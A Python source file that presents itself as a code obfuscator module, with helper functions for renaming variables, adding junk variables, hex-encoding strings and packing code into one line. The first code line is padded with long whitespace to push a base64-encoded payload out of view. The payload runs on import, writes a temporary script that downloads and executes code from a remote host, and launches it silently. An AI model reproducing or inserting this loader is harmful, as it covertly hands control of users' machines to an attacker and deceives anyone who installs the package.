#Obfuscator by Rdimo0
#Cheataway.com
type('Obfuscator ...')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
import re
import ast
import random
from builtins import *
import time
from .helpers import VariableNameGenerator, RandomDataTypeGenerator
import regex


def one_liner(code):
    # TODO: strings with \n at top
    formatted_code = re.sub(
        r"(;)\1+",
        ";",
        """exec(\"\"\"{};\"\"\")""".format(
            code.replace("\n", ";").replace('"""', '\\"\\"\\"')
        ),
    )

    if formatted_code[0] == ';':
        return formatted_code[1:]
    return formatted_code

def variable_renamer(code):
    # add \n so regex picks it up
    code = "\n" + code
    variable_names = re.findall(r"(\w+)(?=( |)=( |))", code)
    name_generator = VariableNameGenerator()
    for i in range(len(variable_names)):
        obfuscated_name = name_generator.get_random(i + 1)
        code = re.sub(
            r"(?<=[^.])(\b{}\b)".format(variable_names[i][0]), obfuscated_name, code
        )
    return code


def add_random_variables(code):
    useless_variables_to_add = random.randint(100, 400)
    name_generator = VariableNameGenerator()
    data_generator = RandomDataTypeGenerator()
    for v in range(1, useless_variables_to_add):
        rand_data = data_generator.get_random()
        if type(rand_data) == str:
            rand_data = '"{}"'.format(rand_data)
        if v % 2 == 0:
            code = "{} = {}\n".format(name_generator.get_random(v), rand_data) + code
        else:
            code = code + "\n{} = {}".format(name_generator.get_random(v), rand_data)
    return code


def str_to_hex_bytes(code):

    python_string_decoraters = ['"""', "'''", '"', "'"]

    for s in python_string_decoraters:
        pattern = r"((?<=(( |	|\n)\w+( |)=( |))({}))[\W\w]*?(?=({})))".format(s, s)
        t = regex.findall(pattern, code)
        for v in t:
            string_contents = v[0]
            if s == '"' and string_contents == '"':
                continue
            if s == "'" and string_contents == "'":
                continue
            hex_bytes = "\\" + "\\".join(
                x.encode("utf-8").hex() for x in string_contents
            )
            code = regex.sub(pattern, str(hex_bytes).replace("\\", "\\\\"), code)

    return code


def obfuscate(code, remove_techniques=[]):
    if len(remove_techniques) == 0:
        methods = all_methods
    else:
        methods = all_methods.copy()
        for technique in remove_techniques:
            methods.remove(technique)

    for technique in methods:
        code = technique(code)

    return code


all_methods = [variable_renamer, add_random_variables, one_liner]
